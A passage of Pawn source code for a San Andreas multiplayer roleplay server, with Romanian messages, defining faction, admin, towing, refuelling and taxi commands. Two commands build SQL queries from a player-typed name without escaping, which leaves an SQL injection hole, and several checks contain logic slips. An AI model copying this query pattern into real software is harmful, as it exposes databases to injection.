	if(PlayerInfo[playerid][pRank] < 2 && IsAMember(playerid)) return SendErrorMsg(playerid, "Ai nevoie de rank 2.");
	extract params -> new player:id; else return SendUsageMsg(playerid, "untie [id]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(!ProxDetectorS(8.0, playerid, id)) return SendErrorMsg(playerid, "Acel player nu este langa tine!");
	if(id == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda pe tine!");
	if(!PlayerTied[id]) return SendErrorMsg(playerid, "Acel player nu este logat!");

	va_SendClientMessage(id, COLOR_LIGHTBLUE, "Ai fost dezlegat de %s.", GetName(playerid));
	va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "L-ai dezlegat pe %s.", GetName(id));
	ProxDetector(30.0, playerid, "* %s l-a dezlegat pe %s.", COLOR_PURPLE, GetName(playerid) ,GetName(id));
	TogglePlayerControllable(id, 1);
	PlayerTied[id] = 0;
	return true;
}
cmd:cmc(playerid, params[]) {
	if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);

	new times=-1;
	foreach(new i : All(Staff<>)) {
		while(++times < 50) SendClientMessage(i,-1,"");
		times=-1;
	}
	return SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s a sters chat-ul staff-ului!", 1, GetName(playerid));
}
cmd:whisper(playerid, params[]) {
	if(HidePM[playerid]) return SendErrorMsg(playerid, "Ai dezactivat aceasta comanda!");
	extract params -> new player:id, string:message[128]; else return SendUsageMsg(playerid, "whisper [id] [text]");
	if(PlayerInfo[playerid][pMuted]) return va_SendClientMessage(playerid, -1, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	if(PlayerInfo[playerid][pLevel] < 3) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda deoarece nu ai minim level 3!");
	if(!ProxDetectorS(5.0, playerid, id)) return SendErrorMsg(playerid, "Nu esti langa acel player!");
	if(playerid == id) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda pe tine!");
	if(HidePM[id]) return SendErrorMsg(playerid, "Acel player a dezactivat aceasta comanda!");

	va_SendClientMessage(id, COLOR_YELLOW, "(Whisper) from %s (%d): %s", GetName(playerid), playerid, message);
	va_SendClientMessage(playerid, COLOR_YELLOW, "(Whisper) sent to %s (%d): %s", GetName(id), id, message);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	PlayerPlaySound(id, 1139, 0.0, 0.0, 0.0);
	return true;
}
cmd:setleader(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3) 
		return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	if(sscanf(params, "ui", params[0], params[1])) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setleader <playerid/name> <faction>");

	if(!IsPlayerConnected(params[0]))
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(params[1]<=0||params[1]>MAX_FACTIONS) 
		return SCMf(playerid, COLOR_WHITE, "Invalid ID. (1-%d).", MAX_FACTIONS);
	
	if(PlayerInfo[params[0]][pMember] > 0 && PlayerInfo[params[0]][pLeader] > 0) 
		return SendClientMessage(playerid,COLOR_WHITE, "Acel player este intr-o factiune.");

	gString[0] = gQuery[0] = (EOS);
	format(gString, 128, "%s este noul lider al factiunii.", GetName(params[0]));
	SendFactionMessage(params[1], COLOR_CLIENT, gString);
	Iter_Add(faction_players<params[1]>, params[0]);
	Iter_Add(faction_leaders, params[0]);
	PlayerInfo[params[0]][pMember] = params[1];

	SetPlayerToTeamColor(params[0]);	
	StartRaportLession(params[0]);

	PlayerInfo[params[0]][pLeader] = params[1];
	FactionMembers[PlayerInfo[params[0]][pMember]] ++;					
	PlayerInfo[params[0]][pRank] = 7;
	format(gString, 128, "%s este liderul factiunii %s.", GetName(params[0]), FactionName(params[1]));
	insertFactionLogs(playerid, params[0], gString);	
	
	if(IsACop(params[0]) || PlayerInfo[params[0]][pMember] == 13) finishAchievement(params[0], 12);
	else if(IsMafie(params[0])) finishAchievement(params[0], 13);
	else finishAchievement(params[0], 14);

	finishAchievement(params[0], 21);

	mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Leader`='%i', `Member`='%i', `Rank`='7' WHERE `id`='%i'", PlayerInfo[params[0]][pLeader], PlayerInfo[params[0]][pMember], PlayerInfo[params[0]][pSQLID]);
	mysql_tquery(SQL, gQuery);	
	SCMf(playerid, COLOR_LIGHTBLUE, "L-ai promovat pe %s ca lider la factiunea %s.", GetName(params[0]), FactionName(params[1]));
	SCMf(params[0], COLOR_LIGHTBLUE, "Admin %s te-a promovat ca lider al factiunii %s.", GetName(playerid), FactionName(params[1]));
	return true;
}

//tester
cmd:settester(playerid, params[]) {
	if(PlayerInfo[playerid][pRank] != 7)
		return true;

	extract params -> new player:id, toggle; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/settester <playerid/name> <tester (1 = on / 0 = off)>");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(!IsPlayerLogged(id))
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if(playerid == id) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if(PlayerInfo[id][pMember] != PlayerInfo[playerid][pMember])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este din factiunea ta!");

	PlayerInfo[id][pTester]=bool:toggle;
	UpdateVar(id, "Tester", toggle);
	if(toggle) {
		finishAchievement(id, 33);	
		SCMf(id, COLOR_LIGHTBLUE, "%s ti-a setat gradul de 'tester' in cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[id][pMember]));
		format(gString, 128, "%s a primit functia de 'tester' in cadrul factiunii %s.", GetName(id), FactionName(PlayerInfo[playerid][pMember]));
	} else {
		SCMf(playerid, COLOR_LIGHTBLUE, "I-ai scos lui %s functia de 'tester' din cadrul factiunii %s.", GetName(id), FactionName(PlayerInfo[playerid][pMember]));
		SCMf(id, COLOR_LIGHTBLUE, "%s ti-a scos gradu de 'tester' din cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[id][pMember]));
	}
	SendFactionMessage(PlayerInfo[id][pMember], COLOR_LIGHTBLUE, gString);		
	return true;
}

cmd:settestero(playerid, params[]) {
	if(PlayerInfo[playerid][pRank] != 7)
		return true;

	extract params -> new string:name[32], toggle; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/settestero <full name> <tester (1 = on / 0 = off)>");

	if compare(name, PlayerInfo[playerid][pUsername]) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu iti poti seta tie acest grad.");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", name);
	mysql_tquery(SQL, gQuery, #cache_settestero, #isi, playerid, name, toggle);	
	return true;
}
redist::cache_settestero(playerid, const username[], toggle) {
	if(!cache_num_rows()) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest cont nu a fost gasit in baza de date!");
	new userid, member, sqlid;
	cache_get_value_name_int(0, "Status", userid);
	cache_get_value_name_int(0, "Member", member);
	cache_get_value_name_int(0, "ID", sqlid);

	if(PlayerInfo[playerid][pMember] != member)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel jucator nu face parte din factiunea ta!");

	if(toggle == 1) {
		if(userid != -1) {
			finishAchievement(userid, 33);	
			SCMf(userid, COLOR_LIGHTBLUE, "%s ti-a setat gradul de 'tester' in cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[userid][pMember]));
			format(gString, 128, "%s a primit functia de 'tester' in cadrul factiunii %s.", GetName(userid), FactionName(PlayerInfo[userid][pMember]));
			SendFactionMessage(PlayerInfo[userid][pMember], COLOR_LIGHTBLUE, gString);	
			PlayerInfo[userid][pTester]=true;
			UpdateVar(userid, "Tester", 1);
		}
		else {
			format(gString, 128, "%s a primit functia de 'tester' in cadrul factiunii %s.", username, FactionName(PlayerInfo[playerid][pMember]));
			SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, gString);	
			_query("UPDATE `users` SET `tester`='1' WHERE `id`='%i'", sqlid);
		}
	} else if(toggle == 0) {
		if(userid != -1) {
			SCMf(userid, COLOR_LIGHTBLUE, "%s ti-a scos gradu de 'tester' din cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[userid][pMember]));
			SCMf(playerid, COLOR_LIGHTBLUE, "I-ai scos lui %s functia de 'tester' din cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[playerid][pMember]));
			PlayerInfo[userid][pTester]=false;
			UpdateVar(userid, "Tester", 0);
		}
		else {
			SCMf(playerid, COLOR_LIGHTBLUE, "I-ai scos lui %s functia de 'tester' din cadrul factiunii %s.", username, FactionName(PlayerInfo[playerid][pMember]));
			_query("UPDATE `users` SET `tester`='0' WHERE `id`='%i'", sqlid);
		}
	}
	 
	return true;
}

//responsabil
cmd:setresponsabil(playerid, params[]) {
	if(PlayerInfo[playerid][pRank] != 7)
		return true;

	extract params -> new player:id, toggle; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setresponsabil <playerid/name> <(1 = on / 0 = off)>");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(!IsPlayerLogged(id))
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	//if(playerid == id) 
		//return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if(PlayerInfo[id][pMember] != PlayerInfo[playerid][pMember])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este din factiunea ta!");

	PlayerInfo[id][pResponsabil]=bool:toggle;
	UpdateVar(id, "Responsabil", toggle);
	if(toggle) {
		finishAchievement(id, 33);	
		SCMf(id, COLOR_LIGHTBLUE, "%s ti-a setat gradul de 'responsabil' in cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[id][pMember]));
		format(gString, 128, "%s a primit functia de 'responsabil' in cadrul factiunii %s.", GetName(id), FactionName(PlayerInfo[playerid][pMember]));
	} else {
		SCMf(playerid, COLOR_LIGHTBLUE, "I-ai scos lui %s functia de 'responsabil' din cadrul factiunii %s.", GetName(id), FactionName(PlayerInfo[playerid][pMember]));
		SCMf(id, COLOR_LIGHTBLUE, "%s ti-a scos gradu de 'responsabil' din cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[id][pMember]));
	}
	SendFactionMessage(PlayerInfo[id][pMember], COLOR_LIGHTBLUE, gString);		
	return true;
}

cmd:setresponsabilo(playerid, params[]) {
	if(PlayerInfo[playerid][pRank] != 7) return SendErrorMsg(playerid, "Nu esti autorizat sa folosesti aceasta comanda!");
	extract params -> new string:name[32], toggle; else return SendUsageMsg(playerid, "setresponsabilo [full name] [tester 1 = on / 0 = off]");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", name);
	mysql_tquery(SQL, gQuery, #cache_setresponsabilo, #isi, playerid, name, toggle);	
	return true;
}
redist::cache_setresponsabilo(playerid, const username[], toggle) {
	if(!cache_num_rows()) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest cont nu a fost gasit in baza de date!");
	new userid, member, sqlid;
	cache_get_value_name_int(0, "Status", userid);
	cache_get_value_name_int(0, "Member", member);
	cache_get_value_name_int(0, "ID", sqlid);

	if(PlayerInfo[playerid][pMember] != member)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel jucator nu face parte din factiunea ta!");

	if(toggle == 1) {
		if(userid != -1) {
			finishAchievement(userid, 33);	
			SCMf(userid, COLOR_LIGHTBLUE, "%s ti-a setat gradul de 'responsabil' in cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[userid][pMember]));
			format(gString, 128, "%s a primit functia de 'responsabil' in cadrul factiunii %s.", GetName(userid), FactionName(PlayerInfo[userid][pMember]));
			SendFactionMessage(PlayerInfo[userid][pMember], COLOR_LIGHTBLUE, gString);	
			PlayerInfo[userid][pResponsabil]=true;
			UpdateVar(userid, "Responsabil", 1);
		}
		else {
			format(gString, 128, "%s a primit functia de 'responsabil' in cadrul factiunii %s.", username, FactionName(PlayerInfo[playerid][pMember]));
			SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, gString);	
			_query("UPDATE `users` SET `Responsabil`='1' WHERE `id`='%i'", sqlid);
		}
	} else if(toggle == 0) {
		if(userid != -1) {
			SCMf(userid, COLOR_LIGHTBLUE, "%s ti-a scos gradu de 'responsabil' din cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[userid][pMember]));
			SCMf(playerid, COLOR_LIGHTBLUE, "I-ai scos lui %s functia de 'responsabil' din cadrul factiunii %s.", GetName(playerid), FactionName(PlayerInfo[playerid][pMember]));
			PlayerInfo[userid][pResponsabil]=false;
			UpdateVar(userid, "Responsabil", 0);
		}
		else {
			SCMf(playerid, COLOR_LIGHTBLUE, "I-ai scos lui %s functia de 'responsabil' din cadrul factiunii %s.", username, FactionName(PlayerInfo[playerid][pMember]));
			_query("UPDATE `users` SET `Responsabil`='0' WHERE `id`='%i'", sqlid);
		}
	}
	 
	return true;
}

cmd:tow(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22) TTCFunction(playerid);
	return true;
}

stock TTCFunction(playerid) {
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {	
		new m = GetVehicleModel(GetPlayerVehicleID(playerid));
		if(m == 525) {
			if(GetPlayerState(playerid)==2) {
				new closestdist = 999999999, vid=0, Float:x[2],Float:y[2],Float:z[2],distance;
				Iter_Remove(StreamedVehicle[playerid], GetPlayerVehicleID(playerid));
			  	foreach(new i : StreamedVehicle[playerid]) {
			        GetVehiclePos(i,x[0],y[0],z[0]);
			        GetPlayerPos(playerid,x[1],y[1],z[1]);
			        distance = floatround(GetDistanceBetweenPoints(x[0],y[0],z[0],x[1],y[1],z[1]));
			        if(distance < closestdist) closestdist = distance, vid = i;
			    }
			    Iter_Add(StreamedVehicle[playerid], GetPlayerVehicleID(playerid));
			    if(!vid) return true;	
				GetVehiclePos(vid, x[0], y[0], z[0]);
				if(GetPlayerDistanceFromPoint(playerid, x[0], y[0], z[0]) > 10) return SendClientMessage(playerid, COLOR_GREY, "There is no car in range.");
				switch(GetVehicleModel(vid)) {
					case 509, 510, 523, 568, 571, 581, 586, 417, 425, 447, 460, 464, 465, 469, 476, 487, 488, 497, 501, 511, 512, 513, 519, 520, 548, 553, 563, 577, 592, 593, 448, 461,462,463,468, 471, 521, 522, 525: return SendClientMessage(playerid,-1, "Nu poti tracta acest vehicul!");
				}
				if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) {
					DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
					DisablePlayerCheckpointEx(playerid);
				}
				else {
					if(CP[playerid] != 0 || targetfind[playerid] != -1) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Checkpoint", "Ai deja un checkpoint activ.\nDoresti sa-l anulezi? Daca da, apasa pe 'Ok'.", "Ok", "Anuleaza");
					format(gString, 256, "Location\tDistanta\nLas Venturas\t%.2fm\nLos Santos\t%.2fm\nSan Fierro\t%.2fm", GetPlayerDistanceFromPoint(playerid, TowCarCk[0][0],TowCarCk[0][1],TowCarCk[0][2]), GetPlayerDistanceFromPoint(playerid, TowCarCk[1][0],TowCarCk[1][1],TowCarCk[1][2]), GetPlayerDistanceFromPoint(playerid, TowCarCk[2][0],TowCarCk[2][1],TowCarCk[2][2]));
					ShowPlayerDialog(playerid, DIALOG_TOWCARLOC, DIALOG_STYLE_TABLIST_HEADERS, "Tow Location", gString, "Select", "Cancel");
					AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
				}
			}
		}
	}
	return true;
}

cmd:towaircraft(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22) TTCExFunction(playerid);
	return true;
}

stock TTCExFunction(playerid) {
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {	
		new m = GetVehicleModel(GetPlayerVehicleID(playerid));
		if(m == 525) {
			if(GetPlayerState(playerid)==2) {
				new closestdist = 999999999, vid=0, Float:x[2],Float:y[2],Float:z[2],distance;
				Iter_Remove(StreamedVehicle[playerid], GetPlayerVehicleID(playerid));
			  	foreach(new i : StreamedVehicle[playerid]) {
			        GetVehiclePos(i,x[0],y[0],z[0]);
			        GetPlayerPos(playerid,x[1],y[1],z[1]);
			        distance = floatround(GetDistanceBetweenPoints(x[0],y[0],z[0],x[1],y[1],z[1]));
			        if(distance < closestdist) closestdist = distance, vid = i;
			    }
			    Iter_Add(StreamedVehicle[playerid], GetPlayerVehicleID(playerid));
			    if(!vid) return true;	
				GetVehiclePos(vid, x[0], y[0], z[0]);
				if(GetPlayerDistanceFromPoint(playerid, x[0], y[0], z[0]) > 10) return SendClientMessage(playerid, COLOR_GREY, "There is no car in range.");
				switch(GetVehicleModel(vid)) {
					case 509, 510, 523, 568, 571, 581, 586, 417, 425, 447, 464, 465, 469, 487, 488, 497, 501, 512, 548, 553, 563, 592, 448, 461,462,463,468, 471, 521, 522, 525: return SendClientMessage(playerid,-1, "Nu poti tracta acest vehicul!");
				}
				if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) {
					DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
					DisablePlayerCheckpointEx(playerid);
				}
				else {
					if(CP[playerid] != 0 || targetfind[playerid] != -1) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Checkpoint", "Ai deja un checkpoint activ.\nDoresti sa-l anulezi? Daca da, apasa pe 'Ok'.", "Ok", "Anuleaza");
					format(gString, 256, "Location\tDistanta\nLas Venturas\t%.2fm\nLos Santos\t%.2fm\nSan Fierro\t%.2fm", GetPlayerDistanceFromPoint(playerid, TowCarCk[0][0],TowCarCk[0][1],TowCarCk[0][2]), GetPlayerDistanceFromPoint(playerid, TowCarCk[1][0],TowCarCk[1][1],TowCarCk[1][2]), GetPlayerDistanceFromPoint(playerid, TowCarCk[2][0],TowCarCk[2][1],TowCarCk[2][2]));
					ShowPlayerDialog(playerid, DIALOG_TOWCARLOC, DIALOG_STYLE_TABLIST_HEADERS, "Tow Location", gString, "Select", "Cancel");
					AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
				}
			}
		}
	}
	return true;
}

cmd:spawnchange(playerid) {
	format(gString, 156, "Option\tStatus\nHouse Spawn\t%s\nDefault Spawn / HQ\t{00FF00}Available{FFFFFF}\nClan Spawn\t%s", PlayerInfo[playerid][pHouse] == 999 ? ("{FF0000}Not available{FFFFFF}") : ("{00FF00}Available{FFFFFF}"), ClanInfo[PlayerInfo[playerid][pClan]][clHQ] == 0 ? ("{FF0000}Not available") : ("{00FF00}Available"));
	return ShowPlayerDialog(playerid, DIALOG_SPAWNCHANGE, DIALOG_STYLE_TABLIST_HEADERS, "Spawn Change", gString, "Select", "Cancel");
}

redist::SlapPlayer(playerid) {
    TogglePlayerControllable(playerid, 0);
    new Float: Pos[3];
    GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]+1);
   	SetPlayerFreeze(playerid, 2);
	PlayerPlaySound(playerid, 1190, 0, 0, 10.0);
	return true;
}
cmd:punish(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] != 3) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new player:id, time; else return SendUsageMsg(playerid, "punish [id] [time]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(id == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda asupra ta!");
	if(OnDuty[playerid]) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");
	if(!(1 <= time <= 300))	return SendErrorMsg(playerid, "Invalid time! (1-300 seconds)");		
	if(!PlayerInfo[id][pJailed]) return SendErrorMsg(playerid, "Acel player nu este in jail!");
	if(IsACop(id)) return true;	

	TogglePlayerControllable(id, false);
	va_SendClientMessage(id, COLOR_LIGHTBLUE, "Ai primit punish de la %s pentru %d secunde.", GetName(playerid), time);
	va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "I-ai dat punish lui %s pentru %d secunde.", GetName(id), time);
	Freezed[id] = 1; PlayerInfo[id][pJailTime] += time;
	return SpawnPlayer(id);
}
cmd:freeze(playerid, params[]) {
    if(!IsAdmin(playerid, 1) && PlayerInfo[playerid][pHelper] < 2) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new player:id; else return SendUsageMsg(playerid, "freeze [id]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
 
	TogglePlayerControllable(id, false); Freezed[id] = 1;
	va_SendClientMessage(id, -1, "You have been frozen by %s.", GetName(playerid));
	va_SendClientMessage(playerid, -1, "You have frozen %s.", GetName(id));
	return true;
}
cmd:entercar(playerid, params[]) {
	if(!IsAdmin(playerid, 2)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new car, seat; else return SendUsageMsg(playerid, "entercar [veh id] [seat id]");
	if(!(0 <= seat <= 4))return SendErrorMsg(playerid, "Invalid Seat ID [0 - 4]");
	return PutPlayerInVehicleEx(playerid, car, seat);
}
cmd:getcar(playerid, params[]) {
    if(!IsAdmin(playerid, 1)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new vehid; else return SendUsageMsg(playerid, "getcar [veh id]");
	if(!IsValidVehicle(vehid)) return SendErrorMsg(playerid, "Invalid vehicle");

	new Float:plocx,Float:plocy,Float:plocz;
	GetPlayerPos(playerid, plocx, plocy, plocz);
	SetVehiclePosEx(vehid,plocx,plocy+4, plocz);
	SetVehicleVirtualWorld(vehid, GetPlayerVirtualWorld(playerid));
	return va_SendClientMessage(playerid, COLOR_GRAD1, "Ai teleportat vehiculul %d la tine.", vehid);
}

stock GetGasStationID(playerid,i=-1) {
	while(++i<GpsBizzType[15]) if(PlayerToPoint(30, playerid, BizzInfo[BizzTypeID[15][i]][bEntranceX], BizzInfo[BizzTypeID[15][i]][bEntranceY], BizzInfo[BizzTypeID[15][i]][bEntranceZ])) return BizzTypeID[15][i];
	return -1;
}

cmd:fill(playerid, params[]) {
	new idcar = GetPlayerVehicleID(playerid), gasid = -1, maxFuel = 100;
	if(Refueling[playerid]) return SendErrorMsg(playerid, "Deja iti incarci vehiculul cu combustibil!");
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMsg(playerid, "Pentru a folosi aceasta comanda trebuie sa fi la volan!");
	if(vehEngine[idcar]) return SendErrorMsg(playerid, "Motorul este pornit, opreste-l.");
	if(Gas[idcar] >= maxFuel) return SendErrorMsg(playerid, "Ai facut deja plinul.");
	if((FindSpawnID(idcar)) != -1) if(CarInfo[FindSpawnID(idcar)][cPFuel]) return maxFuel = 150;
    
	if((gasid = GetGasStationID(playerid)) != -1) {
		TogglePlayerControllable(playerid, false);
		GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~loading~n~~w~~h~the vehicle tank...",RefuelWait,3);
		SetTimerEx(#Fillup, RefuelWait, false, #iiii, playerid, idcar, maxFuel - Gas[idcar], gasid);
		Refueling[playerid] = true;
		return true;
	}
	else {
		if(!PlayerInfo[playerid][pGasCan]) return SendErrorMsg(playerid, "Nu ai o canistra.");
	    if(!PlayerInfo[playerid][pFuel]) return SendErrorMsg(playerid, "Nu ai benzina in canistra!");
        if(Gas[idcar] > maxFuel - 20) return true;
        
		Gas[idcar] += 20; PlayerInfo[playerid][pFuel] = 0;
		UpdateVar(playerid, "Fuel", 0);
	    TogglePlayerControllable(playerid, true);	
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ai incarcat canistra cu 20%%");
	}
	return true;
}
cmd:fillgascan(playerid, params[]) {
	new gasid = GetGasStationID(playerid);
	if(gasid == -1) return SendErrorMsg(playerid, "Nu esti la o benzinarie.");
	if(PlayerInfo[playerid][pFuel] != 0) return SendErrorMsg(playerid, "Ai deja Benzina in canistra!");		
	if(!PlayerInfo[playerid][pGasCan]) return SendErrorMsg(playerid, "Nu ai o canistra.");

	PlayerInfo[playerid][pFuel] = 20; BizzInfo[gasid][bBalance] += 20 * 1000;
	GivePlayerCash(playerid, -(20 * 1000)); UpdateVar(playerid, "Fuel", 20);
	return va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ai incarcat canistra cu 20%s. Pret: $%s.", "%%", FormatNumber(20 * 1000));
}

stock FactionVehicle(playerid) {
	if(!IsPlayerInAnyVehicle(playerid)) return false;
	if(ServerVehicles[GetPlayerVehicleID(playerid)][vFaction] == PlayerInfo[playerid][pMember]) return true;
	return false;
}
cmd:fare(playerid, params[]) {
	if PlayerInfo[playerid][pMember] != 15 && PlayerInfo[playerid][pMember] != 12 && PlayerInfo[playerid][pMember] != 23 *then
		return true;

	if TaxiDuty[playerid] *then {
		if !IsPlayerInAnyVehicle(playerid) *then 
			return true;

		Fare[playerid] = 0;
		TaxiDuty[playerid] = false;
		
		new lastcar = GetPlayerVehicleID(playerid);
		if(VehicleOBJ[lastcar][0]!=INVALID_OBJECT_ID&&FindSpawnID(lastcar)!=-1) 
			DestroyDynamicObject(VehicleOBJ[lastcar][0]), VehicleOBJ[lastcar][0]=INVALID_OBJECT_ID;

		foreach(new i : VehOccupeid<GetPlayerVehicleID(playerid)>) PlayerTextDrawHide(i, FareTD);
		SCMf(playerid, COLOR_WHITE, "Acum nu mai esti la datorie si ai primit $%s, banii facuti de tine.", FormatNumber(TaxiMoney[playerid]));
		GivePlayerCash(playerid, TaxiMoney[playerid]);
		TaxiMoney[playerid] = 0;
		return true;
	}
	// start the command

	if(DeelayCommand[playerid][26]>gettime())
		return DeelayTime(playerid, 26);

	new price,x; gString[0] = (EOS); 
	params[0] = strval(params);

	switch(PlayerInfo[playerid][pMember]) {
		case 12: {
			if(!FactionVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti intr-un vehicul ce apartine factiunii tale!");
			price = !params[0] ? 5000 : params[0], format(gString, 128, "* Taxi Driver %s is now on duty for $%s, use [/service taxi].", GetName(playerid), FormatNumber(price)), x=0;
		}
		case 15: {
			if(!FactionVehicle(playerid)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu esti intr-un vehicul ce apartine factiunii tale!");
		
			price = !params[0] ? 10000 : params[0], format(gString, 128, "* Uber Driver %s is now on duty for $%s, use [/service uber].", GetName(playerid), FormatNumber(price)), x=1;
		}
		case 23: {
			if(PersonalCar(playerid)!=-1) {
				new veh = GetPlayerVehicleID(playerid);
				if(VehicleOBJ[veh][0]==INVALID_OBJECT_ID) {
					if(vehEngine[veh]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa opresti motorul pentru a putea modifica pozitia.");
					
					SendClientMessage(playerid, -1, "{F4AD42}Fare MENU: {FFFFFF}Foloseste-te de cordonatele (X,Y,Z) pentru a muta textul.");
					new Float:vx,Float:vy,Float:vz; GetPlayerPos(playerid, vx, vy, vz);
					VehicleOBJ[veh][0] = CreateDynamicObject(19309,vx,vy,vz,0,0,0,0);
					SetDynamicObjectMaterialText(VehicleOBJ[veh][0], 0, "Yango", 50, "Arial", 27, 1, COLOR_WHITE, 0xFF000000, 1);
					EditDynamicObject(playerid, VehicleOBJ[veh][0]);
					EditVehicleID[playerid] = veh;
					editObjectType[playerid] = 3;
				}
			} else if(!FactionVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti intr-un vehicul ce apartine factiunii tale!");
			
			price = !params[0] ? 15000 : params[0], format(gString, 128, "* Yango Driver %s is now on duty for $%s, use [/service yango].", GetName(playerid), FormatNumber(price));
			x=2;
		}
	}

	DeelayCommand[playerid][26] = gettime()+10;
	new const _x[3] = {5000, 10000, 15000};
	if(price<1||price>_x[x]) 
		return SCMf(playerid, -1, "Suma invalida! ($1-$%s)", FormatNumber(_x[x]));
	
	Fare[playerid] = price;
	TaxiDuty[playerid] = true;
	TaxiMoney[playerid] = 0;
	SCMTA(0x00C700FF, gString);
	Iter_Remove(VehOccupeid<GetPlayerVehicleID(playerid)>, playerid);
	foreach(new i : VehOccupeid<GetPlayerVehicleID(playerid)>) {
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER) continue;
		if(GetPlayerCash(i) < price) SCMf(i, COLOR_GREY, "Nu ai $%d pentru a intra in acest taxi.", FormatNumber(price)), RemovePlayerFromVehicle(i);
		else {
			TaxiDriver[i] = playerid;
			TaxiMoney[i] = 0;
            UpdateTaxiTextdraw(i);
		}
	}    
	Iter_Add(VehOccupeid<GetPlayerVehicleID(playerid)>, playerid);
	UpdateTaxiTextdraw(playerid);
	return true;
}

redist::UpdateTaxiTextdraw(playerid) {
	va_PlayerTextDrawSetString(playerid, FareTD, "Tarif: ~g~$%s~n~~w~~h~Castig total: ~g~$%s", FormatNumber(Fare[playerid]), FormatNumber(TaxiMoney[playerid]));
	PlayerTextDrawShow(playerid, FareTD);
	return true;
}
